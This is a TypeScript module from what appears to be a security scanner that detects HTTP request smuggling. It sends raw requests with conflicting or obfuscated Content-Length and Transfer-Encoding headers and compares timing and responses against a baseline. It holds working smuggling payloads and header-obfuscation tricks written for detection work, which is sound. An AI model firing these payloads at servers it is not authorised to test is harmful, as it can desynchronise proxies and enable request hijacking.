/**
 * HTTP Request Smuggling Detection Module
 *
 * Non-destructive detection of HTTP request smuggling vectors via
 * timing-based + response-diff heuristics. Tests CL.TE, TE.CL, TE.TE,
 * and CL.CL techniques by sending conflicting / obfuscated Content-Length
 * and Transfer-Encoding headers over a raw TCP / TLS socket (the built-in
 * fetch API cannot emit duplicate or whitespace-obfuscated headers, which
 * these tests require).
 *
 * For each technique we compare the test response to a baseline POST:
 *   - timingAnomaly  = elapsed > baseline + 5s   (back-end socket held open)
 *   - responseDiff   = status or body length differs significantly
 *
 * If either signal fires, a HIGH finding is recorded. Only Node built-ins
 * (net, tls, Buffer) are used. 10s timeout per test, 4 hosts max.
 *
 * NOTE: HTTP request smuggling is genuinely tricky to test safely. The
 * timing signal is most reliable when the back-end holds the socket open
 * waiting for more body data (e.g. CL.TE where the smuggled request
 * declares a Content-Length larger than its actual body). The response-diff
 * signal can have false positives — a server that simply rejects malformed
 * requests with 400 will show a status change. Findings should be confirmed
 * manually with Burp Suite's HTTP Request Smuggler extension.
 */
import * as net from "net";
import * as tls from "tls";
import type { SmugglingResult } from "./types";

// ----------------------------------------------------------------------------
// Constants
// ----------------------------------------------------------------------------

const UA = "easm-scanner/1.0";
const TIMEOUT_MS = 10_000; // 10s per spec
const MAX_HOSTS = 4;
const TIMING_THRESHOLD_MS = 5_000; // baseline + 5s
const HARD_CAP_BYTES = 1_000_000; // 1MB response cap to avoid memory blowup

type Technique = "CL.TE" | "TE.CL" | "TE.TE" | "CL.CL";

interface RawResp {
  status: number;
  bodyLength: number;
  elapsed: number;
  body: string;
}

// ----------------------------------------------------------------------------
// Raw HTTP/1.1 over TCP / TLS
// ----------------------------------------------------------------------------

/**
 * Parse the status line + body length out of a raw HTTP response buffer.
 * Returns status=0 if the response is too short or malformed.
 */
function parseRawResponse(raw: string): {
  status: number;
  bodyLength: number;
  body: string;
} {
  const sepIdx = raw.indexOf("\r\n\r\n");
  if (sepIdx < 0) {
    // No header/body separator — treat entire buffer as body.
    return { status: 0, bodyLength: raw.length, body: raw.slice(0, 5000) };
  }
  const head = raw.slice(0, sepIdx);
  const body = raw.slice(sepIdx + 4);
  const firstLine = head.split("\r\n")[0] || "";
  const m = firstLine.match(/^HTTP\/\d(?:\.\d)?\s+(\d+)/);
  const status = m ? parseInt(m[1], 10) : 0;
  return { status, bodyLength: body.length, body: body.slice(0, 5000) };
}

/**
 * Send a raw HTTP/1.1 request over a TCP or TLS socket. Used for smuggling
 * tests where conflicting / duplicate / whitespace-obfuscated headers must
 * be emitted verbatim — `fetch` cannot do this. `headerLines` is a list of
 * pre-formatted `Name: value` strings (no trailing CRLF); duplicate header
 * names ARE allowed (e.g. two `Transfer-Encoding:` lines for TE.TE). A line
 * may itself contain `\r\n ` to encode HTTP header-folding continuations.
 *
 * Always resolves (never rejects). On timeout / socket error / incomplete
 * response, resolves with whatever bytes were received and an `elapsed`
 * reflecting the wait time so the caller can still compute timing anomalies.
 */
function rawHttp(
  url: string,
  method: string,
  headerLines: string[],
  body: string,
  timeoutMs: number = TIMEOUT_MS
): Promise<RawResp | null> {
  return new Promise((resolve) => {
    let u: URL;
    try {
      u = new URL(url);
    } catch {
      resolve(null);
      return;
    }
    const isTls = u.protocol === "https:";
    const port = u.port ? parseInt(u.port, 10) : isTls ? 443 : 80;
    const host = u.hostname;
    const hostHeader = u.host; // includes explicit port if non-standard
    const path = (u.pathname || "/") + (u.search || "");

    const start = Date.now();
    const chunks: Buffer[] = [];
    let totalBytes = 0;
    let settled = false;

    const finish = (socket: net.Socket | null) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      if (socket) {
        try {
          socket.destroy();
        } catch {
          /* ignore */
        }
      }
      const elapsed = Date.now() - start;
      const raw = Buffer.concat(chunks).toString("utf8");
      const parsed = parseRawResponse(raw);
      resolve({
        status: parsed.status,
        bodyLength: parsed.bodyLength,
        elapsed,
        body: parsed.body,
      });
    };

    const timer = setTimeout(() => finish(socket), timeoutMs);

    const writeRequest = (socket: net.Socket) => {
      const lines = [
        `${method} ${path} HTTP/1.1`,
        `Host: ${hostHeader}`,
        `User-Agent: ${UA}`,
        ...headerLines,
        `Connection: close`,
      ];
      const head = lines.join("\r\n") + "\r\n\r\n";
      const reqBuf = Buffer.concat([
        Buffer.from(head, "utf8"),
        Buffer.from(body, "utf8"),
      ]);
      try {
        socket.write(reqBuf);
      } catch {
        finish(socket);
      }
    };

    let socket: net.Socket;
    try {
      if (isTls) {
        socket = tls.connect(
          {
            host,
            port,
            servername: host,
            rejectUnauthorized: false,
            ALPNProtocols: ["http/1.1"], // never negotiate h2 — smuggling is HTTP/1.1 only
          } as tls.ConnectionOptions,
          () => writeRequest(socket)
        );
      } else {
        socket = net.connect({ host, port } as net.NetConnectOpts, () =>
          writeRequest(socket)
        );
      }
    } catch {
      clearTimeout(timer);
      resolve(null);
      return;
    }

    socket.on("error", () => finish(socket));
    socket.on("data", (chunk: Buffer) => {
      chunks.push(chunk);
      totalBytes += chunk.length;
      if (totalBytes >= HARD_CAP_BYTES) finish(socket);
    });
    socket.on("end", () => finish(socket));
    socket.on("close", () => finish(socket));
  });
}

// ----------------------------------------------------------------------------
// Helpers
// ----------------------------------------------------------------------------

/** Compute the byte length of a UTF-8 string (handles multi-byte chars). */
function byteLen(s: string): number {
  return Buffer.byteLength(s, "utf8");
}

/**
 * Build the four smuggling test specs. Bodies are kept verbatim per the task
 * spec; Content-Length values are computed from the actual body bytes so the
 * front-end (which uses CL) reads the entire body.
 */
function buildTests(): {
  technique: Technique;
  headers: string[];
  body: string;
  description: string;
}[] {
  // CL.TE — front-end uses CL, back-end uses TE.
  // Body: chunked terminator (0\r\n\r\n) followed by a smuggled GPOST request.
  // Back-end stops at terminator, leaves "GPOST ..." in socket buffer; the
  // smuggled request declares Content-Length: 10 but only has 2 body bytes,
  // so the back-end waits for the remaining 8 bytes → timing anomaly.
  const clTeBody = `0\r\n\r\nGPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx=`;

  // TE.CL — front-end uses TE (forwards chunked), back-end uses CL.
  // Body is a valid chunked body (one 8-byte chunk "SMUGGLED" + terminator).
  // We declare Content-Length: 4 so the back-end (using CL) reads only 4
  // bytes, leaving the rest in its socket buffer.
  const teClBody = `8\r\nSMUGGLED\r\n0\r\n\r\n`;

  // TE.TE — obfuscated Transfer-Encoding to bypass front-end filtering.
  // Same body as TE.CL; the obfuscation is in the header lines.
  const teTeBody = `8\r\nSMUGGLED\r\n0\r\n\r\n`;

  // CL.CL — two conflicting Content-Length headers.
  // Front-end uses first CL (4), back-end uses second CL (full body length);
  // back-end tries to read more bytes than the front-end sent → waits.
  const clClBody = `easm=clcltest`;

  return [
    {
      technique: "CL.TE",
      headers: [
        `Content-Type: application/x-www-form-urlencoded`,
        `Content-Length: ${byteLen(clTeBody)}`,
        `Transfer-Encoding: chunked`,
      ],
      body: clTeBody,
      description: `Conflicting Content-Length (${byteLen(
        clTeBody
      )}) + Transfer-Encoding: chunked. Front-end (CL) reads full body; back-end (TE) stops at chunked terminator "0\\r\\n\\r\\n", leaving the smuggled "GPOST" request in the socket buffer.`,
    },
    {
      technique: "TE.CL",
      headers: [
        `Content-Type: application/x-www-form-urlencoded`,
        `Content-Length: 4`,
        `Transfer-Encoding: chunked`,
      ],
      body: teClBody,
      description: `Short Content-Length (4) + Transfer-Encoding: chunked. Front-end (TE) forwards the chunked body; back-end (CL) reads only 4 bytes, leaving the remainder in the socket buffer as a smuggled request prefix.`,
    },
    {
      technique: "TE.TE",
      headers: [
        `Content-Type: application/x-www-form-urlencoded`,
        `Content-Length: 4`,
        `Transfer-Encoding: chunked`,
        `Transfer-Encoding : chunked`, // space before colon — obfuscation #1
        `X:\r\n Transfer-Encoding: chunked`, // header folding — obfuscation #2
      ],
      body: teTeBody,
      description: `Obfuscated Transfer-Encoding headers (space-before-colon + header-folding continuation) to bypass front-end TE normalization. If the front-end rejects the obfuscated TE (falls back to CL) but the back-end accepts it (uses TE), the request is smuggled.`,
    },
    {
      technique: "CL.CL",
      headers: [
        `Content-Type: application/x-www-form-urlencoded`,
        `Content-Length: 4`,
        `Content-Length: ${byteLen(clClBody)}`,
      ],
      body: clClBody,
      description: `Two conflicting Content-Length headers (4 vs ${byteLen(
        clClBody
      )}). If the front-end uses the first CL and the back-end uses the second, the back-end tries to read more bytes than the front-end forwarded, holding the socket open waiting for the missing bytes.`,
    },
  ];
}

// ----------------------------------------------------------------------------
// Main entry point
// ----------------------------------------------------------------------------

export async function runSmuggling(
  urls: string[],
  log: (msg: string) => void
): Promise<SmugglingResult> {
  const hosts: SmugglingResult["hosts"] = [];
  const targets = urls.slice(0, MAX_HOSTS);
  log(`Testing HTTP request smuggling on ${targets.length} host(s) ...`);

  for (let i = 0; i < targets.length; i++) {
    const url = targets[i];
    log(`  testing ${url} (${i + 1}/${targets.length}) ...`);

    // ---- Baseline: normal POST with a small body ----
    const baselineBody = "easm=baseline";
    const baseline = await rawHttp(
      url,
      "POST",
      [
        `Content-Type: application/x-www-form-urlencoded`,
        `Content-Length: ${byteLen(baselineBody)}`,
      ],
      baselineBody
    );

    if (!baseline || baseline.status === 0) {
      log(`    [-] ${url} - no baseline response; skipping`);
      hosts.push({ url, tests: [], findings: [] });
      continue;
    }

    log(
      `    [+] baseline: status ${baseline.status}, ${baseline.bodyLength} bytes, ${baseline.elapsed}ms`
    );

    const tests: SmugglingResult["hosts"][0]["tests"] = [];
    const findings: SmugglingResult["hosts"][0]["findings"] = [];

    for (const spec of buildTests()) {
      log(`  testing ${url} for smuggling (${spec.technique}) ...`);
      const r = await rawHttp(url, "POST", spec.headers, spec.body);

      if (!r) {
        tests.push({
          technique: spec.technique,
          payload: spec.body,
          timingAnomaly: false,
          responseDiff: false,
          detail: `No response (socket error / invalid URL). ${spec.description}`,
        });
        continue;
      }

      const timingAnomaly = r.elapsed > baseline.elapsed + TIMING_THRESHOLD_MS;
      const statusDiff = r.status !== baseline.status && r.status !== 0;
      const lengthDiff =
        baseline.bodyLength > 0 &&
        Math.abs(r.bodyLength - baseline.bodyLength) >
          Math.max(200, 0.3 * baseline.bodyLength);
      const responseDiff = statusDiff || lengthDiff;

      const detailParts: string[] = [
        `status ${r.status} (baseline ${baseline.status})`,
        `${r.bodyLength} bytes (baseline ${baseline.bodyLength})`,
        `${r.elapsed}ms (baseline ${baseline.elapsed}ms)`,
      ];
      if (timingAnomaly) detailParts.push("TIMING ANOMALY");
      if (responseDiff) detailParts.push("RESPONSE DIFF");

      tests.push({
        technique: spec.technique,
        payload: spec.body,
        timingAnomaly,
        responseDiff,
        detail: detailParts.join("; "),
      });

      if (timingAnomaly || responseDiff) {
        log(`  [!] ${spec.technique}: anomaly detected`);
        findings.push({
          id: `SMS-${spec.technique.replace(/\./g, "")}`,
          severity: "high",
          title: `Potential HTTP Request Smuggling (${spec.technique})`,
          detail:
            `${spec.description} Observed: ${detailParts.join("; ")}. ` +
            `Timing anomaly = socket held open > baseline+5s (back-end waiting for more body data); ` +
            `response diff = status or body length differs significantly from baseline POST. ` +
            `Manual confirmation with Burp Suite's HTTP Request Smuggler extension is recommended.`,
        });
      } else {
        log(
          `    [+] ${spec.technique}: no anomaly (${r.elapsed}ms, ${r.bodyLength}b, status ${r.status})`
        );
      }
    }

    hosts.push({ url, tests, findings });
    const hits = tests.filter(
      (t) => t.timingAnomaly || t.responseDiff
    ).length;
    log(`  [+] ${url}: ${tests.length} test(s), ${hits} anomaly(ies)`);
  }

  const totalTests = hosts.reduce((a, h) => a + h.tests.length, 0);
  const totalFindings = hosts.reduce((a, h) => a + h.findings.length, 0);
  log(
    `Smuggling scan complete: ${totalTests} test(s), ${totalFindings} finding(s) across ${hosts.length} host(s).`
  );

  return { hosts };
}
